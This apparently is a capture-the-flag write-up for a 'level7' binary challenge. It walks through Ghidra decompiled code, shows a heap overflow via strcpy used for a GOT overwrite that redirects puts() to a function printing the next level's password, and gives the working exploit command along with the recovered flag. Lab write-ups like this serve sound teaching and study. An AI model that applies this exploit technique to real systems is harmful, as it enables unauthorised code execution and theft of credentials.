get the binary on host
* `scp -P 4242 level7@192.168.56.107:./level7 ./binary/level7`

decompile using ghidras
```c
                undefined4 main(undefined4 param_1,int param_2)
                {
                    undefined4 *puVar1;
                    undefined4 uVar2;
                    undefined4 *puVar3;
                    
                    puVar1 = (undefined4 *)malloc(8);
                    *puVar1 = 1;
                    uVar2 = malloc(8);
                    puVar1[1] = uVar2;
                    puVar3 = (undefined4 *)malloc(8);
                    *puVar3 = 2;
                    uVar2 = malloc(8);
                    puVar3[1] = uVar2;
                    strcpy(puVar1[1],*(undefined4 *)(param_2 + 4));
                    strcpy(puVar3[1],*(undefined4 *)(param_2 + 8));
/*080485c2*/        uVar2 = fopen("/home/user/level8/.pass", "r");
/*080485eb*/        fgets(c,68,uVar2);
/*080485f0*/        puts("~~");
                    return 0;
                }
/*080484f4*/    void m(void)
                {
                    undefined4 uVar1;
                    
                    uVar1 = time(0);
                    printf("%s - %d\n",c, uVar1);
                    return;
                }
```

GOT Overwrite, replace puts return by function m\
We need addr of `m()`, `puts()` and `the offset for puVar1[1]`
* m addr ====> 0x0804 84f4
* puts addr => 0x08049928
* offset is 20

We overflow the first strpcy with the addr of puts so when strcpy is call the second time it will write m() addr. Doing so replace all futur call to puts() by call to m()

```
$ ./level7 $(python -c 'print "a"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```